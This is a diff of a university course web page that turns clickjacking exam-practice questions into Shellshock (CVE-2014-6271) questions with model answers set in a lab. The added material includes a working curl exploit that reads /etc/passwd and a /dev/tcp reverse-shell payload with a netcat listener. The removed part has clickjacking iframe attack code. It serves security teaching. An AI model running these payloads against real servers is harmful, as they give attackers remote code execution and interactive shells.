@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Clickjacking — Exam Practice Questions · CSC351</title>
+  <title>Shellshock — Exam Practice Questions · CSC351</title>
   <link rel="stylesheet" href="shared/style.css">
   <script src="shared/menu.js" defer></script>
   <style>
@@ -341,10 +341,10 @@
       <a class="drawer-menu-item" href="exam-sqli.html" style="padding-left: 20px;">
         ↳ SQLi — Practice Questions
       </a>
-      <a class="drawer-menu-item" href="exam-clickjacking.html" style="color: var(--accent); padding-left: 20px;">
+      <a class="drawer-menu-item" href="exam-clickjacking.html" style="padding-left: 20px;">
         ↳ Clickjacking — Practice Questions
       </a>
-      <a class="drawer-menu-item" href="exam-shellshock.html" style="padding-left: 20px;">
+      <a class="drawer-menu-item" href="exam-shellshock.html" style="color: var(--accent); padding-left: 20px;">
         ↳ Shellshock — Practice Questions
       </a>
     </nav>
@@ -357,7 +357,7 @@
       <div class="nav-menu-left" style="margin-left: 48px;">
         <a href="index.html">Topics</a>
         <a href="exam-questions.html">Exam Prep Hub</a>
-        <a href="clickjacking.html">Clickjacking Notes</a>
+        <a href="shellshock.html">Shellshock Hub</a>
       </div>
       <a class="nav-brand" href="index.html">Ant</a>
       <div class="nav-menu-right">
@@ -372,8 +372,8 @@
 
   <!-- Hero -->
   <div class="exam-hero">
-    <div class="exam-label">Lecture 13 · Part 2 · Exam Prep</div>
-    <h1 class="exam-title">Clickjacking — Exam Practice Questions</h1>
+    <div class="exam-label">Lectures 14 &amp; 15 · Part 2 · Exam Prep</div>
+    <h1 class="exam-title">Shellshock — Exam Practice Questions</h1>
     <p class="exam-subtitle">Scenario-based questions with model answers. Click any question to reveal the answer.</p>
   </div>
 
@@ -384,70 +384,98 @@
       <h2>Quick Notes</h2>
       <ul class="notes-list">
         <li>
-          <strong>Golden rule — Ajan said this word for word:</strong>
+          <strong>What Bash is:</strong>
           <ul class="sub-list">
-            <li><em>"The top layer is always clickable"</em> — the user always clicks the topmost iframe regardless of what they physically see on the screen</li>
+            <li>Born Again Shell — standard Linux shell — command-line interface between user and OS kernel</li>
           </ul>
         </li>
         <div class="notes-divider"></div>
         <li>
-          <strong>Two overlapping iframes:</strong>
+          <strong>Parent/child process + environment variables:</strong>
           <ul class="sub-list">
-            <li><strong>Bottom:</strong> real target page, visible (decoy target background)</li>
-            <li><strong>Top:</strong> transparent (<code>opacity: 0</code>), completely invisible but intercepts and receives all clicks</li>
+            <li>Parent spawns child process → each has completely separate memory layout</li>
+            <li>Functions do not automatically pass over → parent process exports them as environment variables</li>
+            <li>Child Bash reads env vars on startup and parses/converts ones starting with function definitions back into real functions</li>
           </ul>
         </li>
         <div class="notes-divider"></div>
         <li>
-          <strong>Coordinate system:</strong>
+          <strong>The bug (CVE-2014-6271):</strong>
           <ul class="sub-list">
-            <li>Origin = top-left corner = <code>(0,0)</code></li>
-            <li><code>top</code> = pixels down, <code>left</code> = pixels right, <code>width</code> + <code>height</code> = iframe dimensions</li>
-            <li>Attacker dynamically adjusts top/left margins until the invisible target button sits exactly over the real visible decoy button</li>
+            <li>Bash scans env vars, sees <code>() {</code> at the beginning → recognizes it as a function definition → runs internal parser function <code>parse_and_execute</code></li>
+            <li><strong>The flaw:</strong> It does not stop parsing at the closing curly bracket <code>}</code> — it keeps reading and immediately executes any trailing command statements written after the semicolon!</li>
+            <li>Existed since 1989 → discovered in 2014 → 25 years hidden in plain sight</li>
           </ul>
         </li>
         <div class="notes-divider"></div>
         <li>
-          <strong>Two stacking rules:</strong>
+          <strong>Proof of concept (PoC):</strong>
           <ul class="sub-list">
-            <li><code>z-index</code> → larger integer values sit on top</li>
-            <li>No <code>z-index</code> → the element declared last in the HTML markup sits on top</li>
+            <li><code>env x='() { :; }; echo vulnerable' ./bash_shellshock -c 'echo test'</code></li>
+            <li>Vulnerable Bash returns: <code>vulnerable</code> followed by <code>test</code></li>
+            <li>Patched Bash returns: only <code>test</code></li>
           </ul>
         </li>
         <div class="notes-divider"></div>
         <li>
-          <strong>Attack variants:</strong>
+          <strong><code>() { :; };</code> breakdown:</strong>
           <ul class="sub-list">
-            <li><strong>Likejacking</strong> → invisible Facebook/decal Like button over decoy prize links</li>
-            <li><strong>Fake login</strong> → transparent input form fields capture target credentials</li>
-            <li><strong>Small iframe overlay</strong> → tiny iframe covering one specific button only, leaving the rest of the page working normally so the victim suspects nothing</li>
-            <li><strong>Sequence of clicks</strong> → maps multiple consecutive clicks across steps — hardest variant to execute</li>
+            <li><code>()</code> = function signature/declaration</li>
+            <li><code>{ :; }</code> = function body containing a colon no-op (null command) → triggers Bash's environment function-import code path</li>
+            <li>Everything after <code>};</code> is the payload execution vector</li>
           </ul>
         </li>
         <div class="notes-divider"></div>
         <li>
-          <strong>Three defense generations:</strong>
+          <strong>The CGI bridge — how it goes remote:</strong>
           <ul class="sub-list">
-            <li><strong>Gen 1 — Frame buster/killer:</strong> JS checks if <code>window.top === window.self</code> and redirects parent if false. <strong>Dead.</strong> Killed by: attacker setting <code>sandbox="allow-forms"</code> on the parent iframe, which disables Javascript execution inside, so the buster logic never runs.</li>
-            <li><strong>Gen 2 — X-Frame-Options (DENY / SAMEORIGIN):</strong> <strong>Deprecated.</strong> Ajan said this explicitly in class — still works on legacy browsers only.</li>
-            <li><strong>Gen 3 — Content-Security-Policy: frame-ancestors:</strong> <code>'none'</code> or <code>'self'</code> or specific URLs. <strong>Current standard.</strong> Configured at Apache/Nginx web server header levels, applying to all pages automatically.</li>
+            <li>HTTP Request → Apache receives and runs a CGI script → spins up a child Bash shell process to execute the script</li>
+            <li>Apache passes all HTTP headers as environment variables to the child Bash shell (e.g., <code>User-Agent</code> header becomes <code>HTTP_USER_AGENT</code>)</li>
+            <li>The vulnerable child Bash scans <code>HTTP_USER_AGENT</code> variable, hits the <code>() {</code> prefix, and executes the trailing shellshock payload immediately</li>
           </ul>
         </li>
         <div class="notes-divider"></div>
         <li>
-          <strong>SOP inside iframes:</strong>
+          <strong>curl flags — the attack tool:</strong>
           <ul class="sub-list">
-            <li>Same origin → parent context can read/write child iframe DOM tree</li>
-            <li>Different origin → Same-Origin Policy blocks DOM tree reads and writes</li>
-            <li>This is why the attacker makes the top target iframe fully transparent — they cannot read the victim's cross-origin page data anyway, so they only intercept physical inputs.</li>
+            <li><code>-A</code> → sets the <code>User-Agent</code> header</li>
+            <li><code>-e</code> → sets the <code>Referer</code> header</li>
+            <li><code>-H</code> → adds custom arbitrary headers</li>
+            <li>All three options translate into environment variables inside the server's CGI environment</li>
+          </ul>
+        </li>
+        <div class="notes-divider"></div>
+        <li>
+          <strong>CGI Header requirement:</strong>
+          <ul class="sub-list">
+            <li>CGI script responses must start with <code>Content-Type: text/plain</code> followed by a completely blank line → otherwise Apache crashes the output with a 500 error, and the attacker never receives the output payload</li>
+          </ul>
+        </li>
+        <div class="notes-divider"></div>
+        <li>
+          <strong>Full executable paths required:</strong>
+          <ul class="sub-list">
+            <li>Inside CGI environments, full pathing must be used: use <code>/bin/cat</code> instead of <code>cat</code>, <code>/bin/id</code> instead of <code>id</code> (since the system <code>PATH</code> shortcuts may not be loaded)</li>
+          </ul>
+        </li>
+        <div class="notes-divider"></div>
+        <li>
+          <strong>Reverse shell configuration:</strong>
+          <ul class="sub-list">
+            <li>Firewalls block unsolicited inbound traffic (attacker → server) but allow outbound traffic (server → attacker)</li>
+            <li>Attacker listens on port: <code>nc -lv 9090</code> and waits for the server to call back</li>
+            <li>Payload: <code>/bin/bash -i > /dev/tcp/ATTACKER_IP/9090 0<&1 2>&1</code></li>
+            <li><code>/bin/bash -i</code> = starts interactive shell</li>
+            <li><code>> /dev/tcp/IP/PORT</code> = redirects shell standard output through a TCP connection back to the attacker</li>
+            <li><code>0<&1</code> = redirects standard input from the same established connection, allowing attacker to type commands</li>
+            <li><code>2>&1</code> = redirects standard errors through the connection</li>
           </ul>
         </li>
       </ul>
       <div class="exam-trap">
-        <strong>The exam traps:</strong><br>
-        Saying <strong>X-Frame-Options</strong> is the current standard → <strong>deduction</strong>.<br>
-        Saying a <strong>frame buster</strong> still works against attackers → <strong>deduction</strong>.<br>
-        Saying <strong>CSRF tokens</strong> protect against clickjacking → <strong>wrong</strong> (the victim is interacting with their own real, authenticated session, so the tokens are completely valid).
+        <strong>The exam trap:</strong><br>
+        Most students write "Bash executes the payload" but skip explaining <strong>HOW</strong> the HTTP payload gets translated into Bash env vars in the first place → the **CGI-to-environment-variable bridge** is worth dedicated marks on the exam sheet!<br>
+        Shellshock is classified as a **Remote Code Execution (RCE)** vulnerability.
       </div>
     </div>
 
@@ -455,38 +483,33 @@
     <div class="question-set">
       <div class="set-header">
         <span class="set-badge">Question Set 1</span>
-        <h2 class="set-title">SEED Lab Clickjacking Setup</h2>
+        <h2 class="set-title">Remote CGI Attack Chain</h2>
       </div>
 
       <div class="scenario-block">
         <div class="scenario-label">Scenario</div>
-        <p class="scenario-text">Ajan demonstrated this exact attack code in the SEED lab. An attacker hosts this page on <code>attacker32.com</code>. The victim is logged into <code>bank32.com</code>.</p>
-        <code class="scenario-code">&lt;!-- Attacker's page on attacker32.com --&gt;
-&lt;iframe id="top" src="http://attacker32.com/fake_prize.html"
-  style="position:absolute; top:0; left:0;
-         width:500px; height:400px; opacity:1.0;"&gt;
-&lt;/iframe&gt;
-
-&lt;iframe id="bottom" src="http://bank32.com/transfer?to=attacker&amp;amount=5000"
-  style="position:absolute; top:0; left:0;
-         width:500px; height:400px; opacity:0.0;"&gt;
-&lt;/iframe&gt;</code>
+        <p class="scenario-text">A penetration tester discovers that <code>http://seedlab-shellshock.com</code> runs Apache with CGI scripts enabled and an unpatched Bash. She runs:</p>
+        <code class="scenario-code">curl -A "() { :; }; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" \
+  http://seedlab-shellshock.com/cgi-bin/vul.cgi</code>
+        <p class="scenario-text" style="margin-top: 10px;">The server successfully returns the contents of <code>/etc/passwd</code>.</p>
       </div>
 
       <!-- Q(a) -->
       <div class="question-card" id="q1a">
         <div class="question-card-header" onclick="toggleCard('q1a')">
           <span class="q-tag">Q(a)</span>
-          <span class="q-pts">2 pts</span>
-          <span class="q-text">Which iframe does the victim see? Which iframe actually receives the click? Explain using Ajan's golden rule.</span>
+          <span class="q-pts">4 pts</span>
+          <span class="q-text">Trace the complete attack chain from the curl command to /bin/cat /etc/passwd executing on the server. Your answer must include what -A does, what Apache does with the header when running a CGI script, how the payload reaches Bash, and what specific bug in Bash causes execution.</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
             <div class="answer-text">
-              The victim physically sees <code>fake_prize.html</code> because its opacity is set to <code>1.0</code>. The bottom <code>bank32.com</code> transfer page is completely invisible (opacity <code>0.0</code>). However, because there are no <code>z-index</code> declarations, the element declared last in the HTML markup (in this case, <code>#bottom</code>) sits on top. 
-              <span class="answer-line">Thus, the invisible <code>#bottom</code> iframe intercepts and receives the victim's physical click. **Ajan's golden rule:** <em>"The top layer is always clickable"</em>, meaning the browser processes clicks on the topmost layer in the stacking order, regardless of opacity.</span>
+              <strong>1. Request Header Injection:</strong> The <code>-A</code> option sets the HTTP <code>User-Agent</code> header value to the attacker's Shellshock payload.
+              <span class="answer-line"><strong>2. The CGI-Env Bridge:</strong> When Apache receives the request, it runs the CGI script <code>vul.cgi</code>. To communicate request context, Apache spawns a child Bash shell process and automatically binds all HTTP headers as server environment variables — mapping the <code>User-Agent</code> value into the <code>HTTP_USER_AGENT</code> variable.</span>
+              <span class="answer-line"><strong>3. Function Parsing Trigger:</strong> Upon startup, the child Bash shell scans all imported environment variables. Recognizing the function declaration prefix <code>() {</code> inside the <code>HTTP_USER_AGENT</code> variable, Bash triggers <code>parse_and_execute</code> to import it as an active shell function.</span>
+              <span class="answer-line"><strong>4. Exploitation Execution:</strong> Due to a parsing logic bug, <code>parse_and_execute</code> fails to stop parsing at the function's closing curly brace <code>}</code>, parsing and immediately running the trailing command line <code>/bin/cat /etc/passwd</code> as an active shell statement under server privileges.</span>
             </div>
           </div>
         </div>
@@ -497,14 +520,14 @@
         <div class="question-card-header" onclick="toggleCard('q1b')">
           <span class="q-tag">Q(b)</span>
           <span class="q-pts">2 pts</span>
-          <span class="q-text">The victim never visited bank32.com directly. Why does the bank still process the transfer as legitimate?</span>
+          <span class="q-text">Why are echo Content-Type: text/plain; echo; required before /bin/cat /etc/passwd? What happens if they are omitted?</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
             <div class="answer-text">
-              The victim is already logged into <code>bank32.com</code> in their browser. When the browser loads the bank page inside the iframe, it automatically attaches the victim's session cookies to all outgoing requests. The bank server processes the request as a fully valid, authenticated transfer transaction, indistinguishable from an intentional action.
+              The CGI protocol strictly requires scripts to return an HTTP <code>Content-Type</code> header followed directly by a completely blank line before writing out body data. Without this formatting, Apache does not know how to handle the execution response and discards the output entirely, returning a 500 Internal Server Error. If omitted, the command executes on the server, but the attacker never receives the contents in the response body.
             </div>
           </div>
         </div>
@@ -514,17 +537,17 @@
       <div class="question-card" id="q1c">
         <div class="question-card-header" onclick="toggleCard('q1c')">
           <span class="q-tag">Q(c)</span>
-          <span class="q-pts">3 pts</span>
-          <span class="q-text">Name all three generations of Clickjacking defense. State dead/deprecated/current for each. For the dead one, explain exactly how attackers defeated it.</span>
+          <span class="q-pts">2 pts</span>
+          <span class="q-text">State the two conditions that must both be true for this remote attack to work. What happens if each is removed?</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
             <div class="answer-text">
-              <strong>Gen 1 — Frame buster script (Dead):</strong> JavaScript blocks checking if the current window is top. Attacker defeats this by configuring the iframe with <code>sandbox="allow-forms"</code>, which disables script execution within the frame so the buster code never runs.
-              <span class="answer-line"><strong>Gen 2 — X-Frame-Options (Deprecated):</strong> Header responses (<code>DENY</code>, <code>SAMEORIGIN</code>). Works on older legacy browsers only, and is deprecated.</span>
-              <span class="answer-line"><strong>Gen 3 — CSP frame-ancestors (Current Standard):</strong> Header responses (<code>frame-ancestors 'none' / 'self'</code>). Configured at the web server level to enforce site-wide security.</span>
+              <strong>1. Unpatched Vulnerable Bash:</strong> If patched, the shell parser will correctly restrict function declaration imports to the matching scope limits of <code>}</code> and reject any trailing payload instructions.
+              <span class="answer-line"><strong>2. Web CGI Script Interface:</strong> If CGI scripts are not configured, Apache handles standard static/dynamic contents without instantiating child shell process bindings, meaning there is no entry path to transfer HTTP headers into Bash context variables.</span>
+              <span class="answer-line">Removing either condition makes remote exploitation completely impossible.</span>
             </div>
           </div>
         </div>
@@ -534,16 +557,15 @@
       <div class="question-card" id="q1d">
         <div class="question-card-header" onclick="toggleCard('q1d')">
           <span class="q-tag">Q(d)</span>
-          <span class="q-pts">3 pts</span>
-          <span class="q-text">Explain why CSRF tokens do NOT protect against Clickjacking, and why SOP does NOT protect against it either.</span>
+          <span class="q-pts">2 pts</span>
+          <span class="q-text">The tester runs /bin/id via Shellshock and gets uid=33(www-data). What does this tell us and which security principle limits the damage?</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
             <div class="answer-text">
-              <strong>CSRF Tokens:</strong> The real target page is loaded legitimately inside the iframe, meaning the form contains a completely genuine, valid CSRF token generated for the user's active session. Since no request parameters are forged, CSRF defenses have nothing to detect.
-              <span class="answer-line"><strong>SOP (Same-Origin Policy):</strong> SOP blocks scripts on one origin from reading/writing data inside document nodes of another origin. Clickjacking does not read or write data inside the target frame — it simply lets a physical user click pass through to trigger a button. SOP has nothing to restrict.</span>
+              This indicates that the shellshock payload executed within the user privileges of <code>www-data</code> (Apache web server's runtime account), rather than high-level <code>root</code> control. The security principle of **Least Privilege** restricts this runtime execution context to low-privilege bounds, preventing the attacker from immediately editing system files, dropping root tables, or compromising other system boundaries.
             </div>
           </div>
         </div>
@@ -556,31 +578,32 @@
     <div class="question-set">
       <div class="set-header">
         <span class="set-badge">Question Set 2</span>
-        <h2 class="set-title">Header Bypass &amp; Attack Variants</h2>
+        <h2 class="set-title">Reverse Shell Analysis</h2>
       </div>
 
       <div class="scenario-block">
         <div class="scenario-label">Scenario</div>
-        <p class="scenario-text">A security researcher captures this HTTP response header from <code>bank32.com</code>:</p>
-        <code class="scenario-code">HTTP/1.1 200 OK
-Content-Type: text/html
-X-Frame-Options: SAMEORIGIN</code>
-        <p class="scenario-text" style="margin-top: 10px;">An attacker successfully embeds <code>bank32.com</code> inside an iframe on <code>evil.bank32.com</code> and launches a Clickjacking attack.</p>
+        <p class="scenario-text">After confirming the Shellshock vulnerability, the tester sets up a reverse shell. On her own machine (IP <code>10.9.0.1</code>), she runs:</p>
+        <code class="scenario-code">nc -lv 9090</code>
+        <p class="scenario-text" style="margin-top: 10px;">Then she sends the exploit request:</p>
+        <code class="scenario-code">curl -A "() { :; }; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1" \
+  http://seedlab-shellshock.com/cgi-bin/vul.cgi</code>
+        <p class="scenario-text" style="margin-top: 10px;">An interactive shell prompt immediately establishes on her netcat listener window.</p>
       </div>
 
       <!-- Q(a) -->
       <div class="question-card" id="q2a">
         <div class="question-card-header" onclick="toggleCard('q2a')">
           <span class="q-tag">Q(a)</span>
-          <span class="q-pts">2 pts</span>
-          <span class="q-text">How is the attacker able to bypass X-Frame-Options: SAMEORIGIN in this scenario?</span>
+          <span class="q-pts">3 pts</span>
+          <span class="q-text">What is this technique called? Why does it connect FROM the server TO the attacker rather than the attacker connecting directly to the server?</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
             <div class="answer-text">
-              The <code>SAMEORIGIN</code> directive allows a page to be framed by any page sharing the exact same parent origin. Since the attacker hosts their page on <code>evil.bank32.com</code>, depending on how subdomains are evaluated by older browser implementations, it may be treated as sharing the same top-level origin, allowing the subdomain to successfully frame the site.
+              This is a <strong>reverse shell</strong>. It establishes connections from the server back to the attacker because network firewalls typically block unsolicited incoming connection requests (inbound filters). However, firewalls almost always permit outgoing connections initiated by the server itself (outbound filters). Having the server "call out" to the attacker's machine completely bypasses standard inbound firewall blocks.
             </div>
           </div>
         </div>
@@ -590,17 +613,18 @@ X-Frame-Options: SAMEORIGIN</code>
       <div class="question-card" id="q2b">
         <div class="question-card-header" onclick="toggleCard('q2b')">
           <span class="q-tag">Q(b)</span>
-          <span class="q-pts">2 pts</span>
-          <span class="q-text">What should the developer have used instead? Write the exact header and explain one advantage it has over X-Frame-Options.</span>
+          <span class="q-pts">3 pts</span>
+          <span class="q-text">Explain what each part of /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 does.</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
             <div class="answer-text">
-              Recommended Header:
-              <code class="answer-code">Content-Security-Policy: frame-ancestors 'self'</code>
-              Advantage: <code>frame-ancestors</code> allows the developer to supply a whitelist of multiple safe URLs that can frame the page, whereas <code>X-Frame-Options</code> can only accept one single origin. Furthermore, CSP represents the current web security standard, while <code>X-Frame-Options</code> is deprecated.
+              <strong><code>/bin/bash -i</code>:</strong> Instantiates an interactive Bash shell process.
+              <span class="answer-line"><strong><code>> /dev/tcp/10.9.0.1/9090</code>:</strong> Redirects standard output (stdout) of the shell process to a TCP network socket pointing back to the attacker's IP on port 9090.</span>
+              <span class="answer-line"><strong><code>0<&1</code>:</strong> Redirects standard input (stdin) from standard output, allowing any keystrokes sent by the attacker through the socket connection to feed directly into the shell process input.</span>
+              <span class="answer-line"><strong><code>2>&1</code>:</strong> Redirects standard error (stderr) to stdout, ensuring any execution syntax errors or console output are also piped back to the attacker's terminal.</span>
             </div>
           </div>
         </div>
@@ -610,15 +634,15 @@ X-Frame-Options: SAMEORIGIN</code>
       <div class="question-card" id="q2c">
         <div class="question-card-header" onclick="toggleCard('q2c')">
           <span class="q-tag">Q(c)</span>
-          <span class="q-pts">3 pts</span>
-          <span class="q-text">The attacker's page uses a small iframe overlay variant instead of a full-page iframe. Explain how this variant works and why it is harder for the victim to detect.</span>
+          <span class="q-pts">2 pts</span>
+          <span class="q-text">What does nc -lv 9090 do on the attacker's machine and why must it be run BEFORE the curl command?</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
             <div class="answer-text">
-              Rather than framing the entire bank page over the attacker's decoy, the attacker targets a single critical action and overlays a tiny, transparent iframe (sized identically to one button) exactly over a visible decoy button. The rest of the page remains the attacker's normal, legitimate-looking decoy site. If the victim clicks anywhere else on the page, the decoy reacts correctly. The victim does not suspect any security issue because most of the UI responds exactly as expected.
+              The <code>nc</code> (netcat) utility sets up an active listener (<code>-l</code>) on port 9090, outputting verbose statuses (<code>-v</code>), waiting for incoming TCP connections. It must be running before the exploit is launched because the server immediately tries to connect to 10.9.0.1:9090 once Shellshock triggers. If no listener is waiting on the attacker's machine, the outbound socket connection is immediately refused and the shell exits.
             </div>
           </div>
         </div>
@@ -628,16 +652,16 @@ X-Frame-Options: SAMEORIGIN</code>
       <div class="question-card" id="q2d">
         <div class="question-card-header" onclick="toggleCard('q2d')">
           <span class="q-tag">Q(d)</span>
-          <span class="q-pts">3 pts</span>
-          <span class="q-text">Ajan demonstrated SOP behavior inside iframes using three iframes — A and B from attacker32.com, C from bank32.com. Explain which iframe the parent can and cannot read, and why this matters for Clickjacking.</span>
+          <span class="q-pts">2 pts</span>
+          <span class="q-text">How does a reverse shell differ from simply running /bin/cat /etc/passwd via Shellshock? Why do attackers prefer the reverse shell?</span>
           <span class="q-chevron">›</span>
         </div>
         <div class="question-card-answer">
           <div class="answer-inner">
             <div class="answer-label">Model Answer</div>
             <div class="answer-text">
-              The parent page can read and write inside iframes A and B because they share the same origin (<code>attacker32.com</code>) and SOP allows DOM access. The parent cannot access the DOM of iframe C because it belongs to a different origin (<code>bank32.com</code>) and SOP blocks cross-origin access.
-              <span class="answer-line">This matters because Clickjacking is explicitly designed to bypass SOP limitations. Since the attacker's script cannot extract the bank token, transfer form fields, or user account balances from iframe C, their only option is to lure the authenticated user into physically clicking the invisible transfer button itself.</span>
+              Running a single command like <code>/bin/cat /etc/passwd</code> is stateless — the attacker triggers the command, receives a single snapshot response, and the connection terminates. 
+              <span class="answer-line">A reverse shell establishes an ongoing, live interactive terminal session. Attackers prefer this because it allows them to type commands sequentially in real time, explore directory trees, run multiple system binaries, audit local files, pivot to adjacent systems, and establish persistent persistence hooks on the target.</span>
             </div>
           </div>
         </div>
